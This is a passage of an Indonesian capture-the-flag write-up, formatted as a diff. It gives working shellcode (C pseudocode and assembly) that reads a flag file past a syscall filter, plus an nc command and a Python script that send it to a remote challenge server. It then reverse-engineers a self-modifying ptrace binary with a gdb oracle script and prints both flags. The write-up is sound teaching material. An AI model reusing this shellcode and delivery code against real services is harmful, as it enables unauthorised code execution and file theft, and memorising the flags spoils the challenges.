+1) `openat2(AT_FDCWD, "/app/flag_name_...", how={0})`
+2) loop `read(fd, buf, 0x1000)` ke stack
+3) `writev(1, &iov, 1)` untuk mencetak (bypass aturan `write`)
+4) `exit(0)`
+
+#### Pseudocode shellcode
+
+```c
+void sc() {
+  struct open_how how = {0};
+  int fd = syscall(SYS_openat2, AT_FDCWD,
+                   "flag_name_Should_Be_R@ndom_ahahahahahahahahah.txt",
+                   &how, sizeof(how));
+  if (fd < 0) exit(1);
+
+  char *buf = rsp + 0x200;
+  for (;;) {
+    long n = syscall(SYS_read, fd, buf, 0x1000);
+    if (n <= 0) break;
+    struct iovec iov = { .iov_base = buf, .iov_len = (size_t)n };
+    syscall(SYS_writev, 1, &iov, 1);
+  }
+  exit(0);
+}
+```
+
+#### Shellcode ASM
+
+```asm
+BITS 64
+DEFAULT REL
+
+%define __NR_writev   20
+%define __NR_read     0
+%define __NR_openat2  437
+%define __NR_exit     60
+
+%define AT_FDCWD      -100
+
+_start:
+    sub rsp, 0x2000
+
+    mov edi, AT_FDCWD
+    lea rsi, [filename]
+    lea rdx, [rsp]
+    xor eax, eax
+    mov [rsp], rax
+    mov [rsp+8], rax
+    mov [rsp+16], rax
+    mov r10d, 0x18
+    mov eax, __NR_openat2
+    syscall
+
+    test eax, eax
+    js fail
+    mov ebx, eax
+
+    lea r12, [rsp+0x200]
+.loop:
+    mov edi, ebx
+    mov rsi, r12
+    mov edx, 0x1000
+    mov eax, __NR_read
+    syscall
+    test eax, eax
+    jle done
+
+    lea r13, [iov]
+    mov [r13], r12
+    mov [r13+8], rax
+    mov edi, 1
+    mov rsi, r13
+    mov edx, 1
+    mov eax, __NR_writev
+    syscall
+    jmp .loop
+
+done:
+    xor edi, edi
+    mov eax, __NR_exit
+    syscall
+
+fail:
+    mov edi, 1
+    mov eax, __NR_exit
+    syscall
+
+filename:
+    db 'flag_name_Should_Be_R@ndom_ahahahahahahahahah.txt', 0
+
+    align 8
+iov:
+    dq 0, 0
+```
+
+Build jadi raw bytes:
+
+```bash
+nasm -f bin -o shellcode.bin shellcode.asm
+```
+
+---
+
+### Eksekusi ke remote
+
+Ada dua cara: `nc` manual atau kita buat script.
+
+#### Cara 1 — manual
+
+```bash
+cat shellcode.bin | nc 159.89.106.147 1337
+```
+
+#### Cara 2 — pakai `solve.py`
+
+```python
+#!/usr/bin/env python3
+import socket
+import sys
+
+HOST = sys.argv[1] if len(sys.argv) > 1 else "159.89.106.147"
+PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
+
+with open("shellcode.bin", "rb") as f:
+    sc = f.read()
+
+s = socket.create_connection((HOST, PORT), timeout=10)
+
+buf = b""
+while b"Send shellcode" not in buf:
+    chunk = s.recv(4096)
+    if not chunk:
+        break
+    buf += chunk
+    if len(buf) > 1_000_000:
+        break
+
+sys.stdout.buffer.write(buf)
+sys.stdout.flush()
+
+s.sendall(sc)
+try:
+    s.shutdown(socket.SHUT_WR)
+except OSError:
+    pass
+
+while True:
+    chunk = s.recv(4096)
+    if not chunk:
+        break
+    sys.stdout.buffer.write(chunk)
+    sys.stdout.flush()
+
+s.close()
+```
+
+```bash
+python3 solve.py 159.89.106.147 1337
+```
+
+Output akhirnya (flag):
+
+```
+0xL4ugh{D0n'tF000rgoot_k33p_up_Ieesss_withhhh_n3w_5y5c4llsssss5s5s5sss}
+```
+
+### Flag
+
+`0xL4ugh{D0n'tF000rgoot_k33p_up_Ieesss_withhhh_n3w_5y5c4llsssss5s5s5sss}`
+
+---
+
+## Psycho Rev – Reverse Engineering
+
+### Intro
+
+Challenge ini kelihatannya “cuma” flag checker: `./chall <flag>` lalu outputnya either `Correct!` atau `Wrong Flag.`. Tapi begitu dibedah, dia bukan tipe checker yang tinggal cari string flag di `.rodata`. Binary ini *statically linked*, *stripped*, dan (yang paling ngeselin) **self‑modifying**: ada `fork + ptrace` yang nulis ulang instruction di runtime.
+
+Jadi alurnya di write‑up ini: kita mulai dari recon, ketemu blob “flag” yang bukan plaintext, bongkar momen compare-nya (dengan alamat lengkap), lalu “exploit” versi RE: bikin *oracle* untuk membalik transformasi sampai dapet flag.
+
+---
+
+### Recon: buka mata dulu, jangan langsung nebak
+
+Mulai dari hal paling basic:
+
+```bash
+$ ls -la
+chall
+
+$ file chall
+chall: ELF 64-bit LSB executable, x86-64, statically linked, stripped
+
+$ ./chall
+Usage: ./chall <flag>
+```
+
+Cari string yang jelas-jelas jadi output:
+
+```bash
+$ strings -n 4 chall | rg -n 'Correct!|Wrong Flag|Usage'
+Correct!
+Wrong Flag.
+Usage: ./chall <flag>
+```
+
+Terus cek section biar tau “harta” biasanya ngumpet di mana:
+
+```bash
+$ readelf -S chall
+# ... .text @ 0x401000 (offset 0x1000)
+# ... .data @ 0x40d000 (offset 0xd000)
+```
+
+Di `.data` ada blob non‑ASCII yang panjangnya “pas” buat flag checker:
+
+```bash
+# dump .data (offset 0xd000)
+import pathlib
+b = pathlib.Path("chall").read_bytes()
+chunk = b[0xd000:0xd000+0x73]
+print(chunk.hex())
+```
+
+Khususnya, ada 38 byte mulai virtual address `0x40d04d` (file offset `0xd04d`). Ini nanti terbukti sebagai **target compare** (bukan plaintext flag).
+
+---
+
+### Plot twist: self‑modifying + anti‑analysis
+
+Sebelum ngomongin “flag compare”, ada satu hal yang harus kita akui dulu: binary ini nggak mau dianalisis dengan cara lurus.
+
+Kalau kita scan syscall instruction di `.text`, kelihatan ada pola yang khas:
+
+- `ptrace` (syscall number `0x65` di x86‑64 Linux): dipakai beberapa kali.
+- `fork` (syscall `0x39`)
+- `kill(SIGSTOP)` (syscall `0x3e` + `esi=0x13`)
+
+Alamat syscall yang relevan (hasil scan `0f 05` di `.text`):
+
+- `fork` syscall: `0x403721`
+- `kill(SIGSTOP)` syscall: `0x403671`
+- `ptrace` syscall: `0x4015a7`, `0x40209c`, `0x4020f9`, `0x402c18`, `0x403ea5`
+
+Intinya: binary ini bikin proses anak buat *ngoprek* proses induk dengan `ptrace` (dan ngelakuin `SIGSTOP` buat sinkronisasi). Ini bikin debugging statis jadi misleading karena sebagian instruction **baru “jadi” saat runtime**.
+
+#### Cara “jinak” untuk lihat patch runtime: trace `PTRACE_POKETEXT`
+
+Trik praktisnya: jangan langsung fight di gdb dulu. Kita bisa “nguping” aksi `ptrace`‑nya, khususnya request `PTRACE_POKETEXT` (`req=4`) yang nulis instruction.
+
+Salah satu output yang muncul saat aku trace:
+
+```
+ptrace(req=4 pid=... addr=0x401920 data=0xaaea944412e289c0) -> 0x0
+ptrace(req=4 pid=... addr=0x401928 data=0x3a61e2faaaaaaaaa) -> 0x0
+ptrace(req=4 pid=... addr=0x40c5b8 data=0x61aaea6f63c299c0) -> 0x0
+```
+
+Lalu untuk bikin “versi hasil unpack” yang lebih stabil dianalisis, aku copy binary dan nulis qword tersebut langsung ke file offset yang sesuai.
+
+Rumus offset (karena `.text` load di `0x401000` dari file offset `0x1000`):
+
+```
+file_off = (vaddr - 0x401000) + 0x1000
+```
+
+Contoh script patch:
+
+```py
+import struct, pathlib
+
+src = pathlib.Path("chall").read_bytes()
+dst = bytearray(src)
+
+patches = {
+    0x1920: 0xaaea944412e289c0,  # vaddr 0x401920 -> off 0x1920
+    0x1928: 0x3a61e2faaaaaaaaa,  # vaddr 0x401928 -> off 0x1928
+    0xc5b8: 0x61aaea6f63c299c0,  # vaddr 0x40c5b8 -> off 0xc5b8
+}
+
+for off, q in patches.items():
+    dst[off:off+8] = struct.pack("<Q", q)
+
+pathlib.Path("chall_unpacked").write_bytes(dst)
+```
+
+Dengan `chall_unpacked` ini, kita bisa fokus ke logic compare tanpa kebanyakan “noise” self‑modifying.
+
+---
+
+### Bagian inti: panjang flag, buffer target, dan titik compare
+
+Ada tiga potongan ASM yang jadi “peta harta”.
+
+#### 1) Panjang flag harus 0x26 (38)
+
+Di `chall_unpacked`, length check-nya kelihatan dari `repnz scasb`:
+
+```asm
+0x4028d2: b9 27 00 00 00        mov    $0x27,%ecx
+0x4028da: f2 ae                 repnz scasb %es:(%rdi),%al
+```
+
+Pseudocode:
+
+```c
+// cari '\0' dalam window 0x27 byte
+// valid kalau '\0' ketemu persis di byte ke-0x26
+if (strlen(flag) != 0x26) fail();
+```
+
+#### 2) Target compare itu 38 byte dari `.data` @ `0x40d04d`
+
+Blok yang mindahin 38 byte itu sangat jelas:
+
+```asm
+0x4025d9: b9 26 00 00 00        mov    $0x26,%ecx
+0x4025de: 48 8d 35 68 aa 00 00  lea    0xaa68(%rip),%rsi  # 0x40d04d
+0x4025e5: 49 8d 7f 64           lea    0x64(%r15),%rdi
+0x402584: f3 a4                 rep movsb
+```
+
+Pseudocode:
+
+```c
+// base = r15 (di runtime kebaca seperti 0x10000000)
+memcpy(base + 0x64, (void*)0x40d04d, 0x26);  // expected bytes (encoded)
+```
+
+Di runtime (breakpoint nanti), `base+0x64` terlihat jadi `0x10000064`.
+
+#### 3) Compare final ada di `0x406270` (repz cmpsb)
+
+Ini wrapper “memcmp” yang jadi momen paling enak buat ngintip:
+
+```asm
+0x406270: f3 a6                 repz cmpsb (%rdi),(%rsi)
+0x406272: 0f 95 c0              setne  %al
+0x406275: 0f b6 f8              movzbl %al,%edi
+```
+
+Pseudocode:
+
+```c
+bool mismatch = memcmp(rdi, rsi, rcx) != 0;
+return mismatch; // dipakai buat cabang ke "Correct!" / "Wrong Flag."
+```
+
+Dan di breakpoint ini, register-nya bilang:
+
+- `rcx = 38`
+- `rdi = base+0x64`  → expected bytes (yang asalnya dari `.data`)
+- `rsi = base+0x200` → hasil transformasi input kita
+
+---
+
+### Exploit: bikin oracle, balikkan transformasi
+
+Kuncinya: **yang dibandingkan bukan flag plaintext**, tapi hasil transformasi per‑byte dari input.
+
+Kalau kita masukin input yang sama terus (misal `A` 38 kali), output transformasinya juga *konsisten* (misal jadi `H` 38 kali). Itu berarti transformasinya dapat diperlakukan sebagai **substitusi karakter**: `out = T[in]`.
+
+#### Step 1 — bikin oracle di gdb (dump buffer hasil transformasi)
+
+Breakpoint di `0x406270`, lalu dump 38 byte dari `$rsi`:
+
+```gdb
+set pagination off
+set follow-fork-mode child
+set detach-on-fork on
+handle SIGSTOP nostop noprint pass
+
+b *0x406270
+commands
+  silent
+  dump binary memory /tmp/rsi.bin $rsi $rsi+38
+  quit
+end
+
+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+
+Dari situ, `rsi.bin` jadi “jawaban oracle” untuk input tersebut.
+
+#### Step 2 — build mapping, invert, decode blob target di `.data`
+
+Script Python yang idenya sederhana:
+
+1. Untuk setiap kandidat karakter (huruf, digit, `{}`, `_`, `-`), jalankan `gdb` sekali.
+2. Ambil byte pertama dari dump `$rsi` → itu `T[ch]`.
+3. Balik mapping `T^{-1}`.
+4. Ambil target bytes dari `.data` (file offset `0xd04d`, 38 byte).
+5. Decode → flag plaintext.
+
+```python
+import pathlib, subprocess, textwrap, string
+
+BIN = "./chall_unpacked"
+N = 38
+
+def gdb_escape(s: str) -> str:
+    return "'" + s.replace("'", "'\\''") + "'"
+
+def rsi_first_byte(arg: str, tag: str) -> int:
+    gdbcmd = textwrap.dedent(f"""
+    set pagination off
+    set follow-fork-mode child
+    set detach-on-fork on
+    handle SIGSTOP nostop noprint pass
+    b *0x406270
+    commands
+      silent
+      dump binary memory /tmp/rsi_{tag}.bin $rsi $rsi+{N}
+      quit
+    end
+    run {gdb_escape(arg)}
+    """)
+    cmd = f"/tmp/cmd_{tag}.gdb"
+    pathlib.Path(cmd).write_text(gdbcmd)
+    subprocess.run(["gdb", "-q", BIN, "-x", cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    return pathlib.Path(f"/tmp/rsi_{tag}.bin").read_bytes()[0]
+
+candidates = string.ascii_letters + string.digits + "{}_-"
+enc_map = {ch: rsi_first_byte(ch * N, f"{ord(ch):02x}") for ch in candidates}
+inv = {v: k for k, v in enc_map.items()}
+
+blob = pathlib.Path("chall").read_bytes()[0xd04d:0xd04d+N]  # vaddr 0x40d04d
+flag = "".join(inv[b] for b in blob)
+print(flag)
+```
+
+Outputnya:
+
+```
+0xL4ugh{P5ych0_Flag_Hid3s_In_The_Gat3}
+```
+
+---
+
+### Proof
+
+```bash
+$ ./chall '0xL4ugh{P5ych0_Flag_Hid3s_In_The_Gat3}'
+Correct!
+```
+
+### Flag
+
+`0xL4ugh{P5ych0_Flag_Hid3s_In_The_Gat3}`
+
+---
